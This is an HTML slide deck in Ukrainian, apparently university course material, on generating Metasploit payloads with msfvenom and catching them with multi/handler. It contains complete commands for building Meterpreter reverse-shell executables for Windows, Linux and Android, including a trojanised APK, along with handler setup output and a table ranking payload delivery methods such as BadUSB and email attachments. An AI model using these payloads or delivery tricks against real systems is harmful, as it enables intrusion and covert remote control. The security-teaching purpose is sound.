@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 10.5 — msfvenom: практика з Multi/Handler</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="10">
+  <div class="slide-deck">
+    <section class="slide active title-slide">
+      <h1>msfvenom: практика з Multi/Handler</h1>
+      <div class="subtitle">Тема 10.5 — Утримання доступу та обхід антивірусів</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Генерація payload'ів для платформ</h2>
+      <div class="three-col-grid" style="margin-top:1rem;">
+        <div class="card-blue">
+          <h3>Windows</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.65em;">
+# EXE
+msfvenom -p windows/
+  meterpreter/reverse_tcp
+  LHOST=192.168.1.50
+  LPORT=4444
+  -f exe -o payload.exe
+
+# HTTPS
+msfvenom -p windows/
+  meterpreter/reverse_https
+  LHOST=192.168.1.50
+  LPORT=443
+  -f exe -o pay_https.exe
+          </div>
+        </div>
+        <div class="card-green">
+          <h3>Linux</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.65em;">
+# ELF
+msfvenom -p linux/x86/
+  meterpreter/reverse_tcp
+  LHOST=192.168.1.50
+  LPORT=4444
+  -f elf -o payload.elf
+
+chmod +x payload.elf
+          </div>
+        </div>
+        <div class="card-yellow">
+          <h3>Android</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.65em;">
+# APK
+msfvenom -p android/
+  meterpreter/reverse_tcp
+  LHOST=192.168.1.50
+  LPORT=4444
+  -o evil.apk
+
+# З шаблоном
+msfvenom ... -x legit.apk
+  -o trojan.apk
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Multi/Handler та доставка</h2>
+      <div class="card-purple" style="margin-bottom:1.5rem;">
+        <h3>Налаштування handler</h3>
+        <div class="code-block" style="margin-top:0.8rem;font-size:0.72em;">
+msf6&gt; use exploit/multi/handler
+msf6&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6&gt; set LHOST 0.0.0.0
+msf6&gt; set LPORT 4444
+msf6&gt; set ExitOnSession false    # кілька підключень
+msf6&gt; exploit -j                  # фоновий режим
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Meterpreter session 1 opened
+        </div>
+      </div>
+
+      <table class="comparison-table" style="font-size:0.82em;">
+        <thead><tr><th>Метод доставки</th><th>Опис</th><th>Ризик виявлення</th></tr></thead>
+        <tbody>
+          <tr><td><strong>USB (HID/BadUSB)</strong></td><td>Rubber Ducky, Bash Bunny</td><td class="cell-green">Низький</td></tr>
+          <tr><td><strong>Email</strong></td><td>Вкладення: macro, exe, lnk</td><td class="cell-yellow">Середній</td></tr>
+          <tr><td><strong>Web hosting</strong></td><td>HTTP-сервер + social eng</td><td class="cell-yellow">Середній</td></tr>
+          <tr><td><strong>Template injection</strong></td><td>Payload у легітимному exe (-x -k)</td><td class="cell-green">Низький</td></tr>
+        </tbody>
+      </table>
+    </section>
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls"><button id="btn-prev" onclick="prev()">&#8592;</button><button id="btn-next" onclick="next()">&#8594;</button></div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
